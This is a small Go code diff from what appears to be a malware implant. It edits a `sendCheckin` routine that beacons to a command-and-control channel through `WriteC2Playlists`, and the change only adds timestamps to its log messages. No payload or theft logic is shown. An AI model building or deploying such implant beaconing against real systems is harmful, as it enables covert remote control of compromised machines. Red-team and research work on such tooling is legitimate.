@@ -94,7 +94,8 @@ func (imp *Implant) sendCheckin() {
 			time.Sleep(time.Duration(wait) * time.Second)
 			// One retry after wait
 			if err2 := imp.client.WriteC2Playlists(ctx, chunks); err2 == nil {
-				fmt.Printf("[*] Check-in sent (client_id=%s)\n", clientID)
+				fmt.Printf("[*] Check-in sent (client_id=%s) at %s\n",
+		clientID, time.Now().Format("15:04:05"))
 				imp.checkinPending = false
 				return
 			}
@@ -102,7 +103,8 @@ func (imp *Implant) sendCheckin() {
 		imp.checkinPending = true
 		return
 	}
-	fmt.Printf("[*] Check-in sent (client_id=%s)\n", clientID)
+	fmt.Printf("[*] Check-in sent (client_id=%s) at %s\n",
+		clientID, time.Now().Format("15:04:05"))
 	imp.checkinPending = false
 }
 
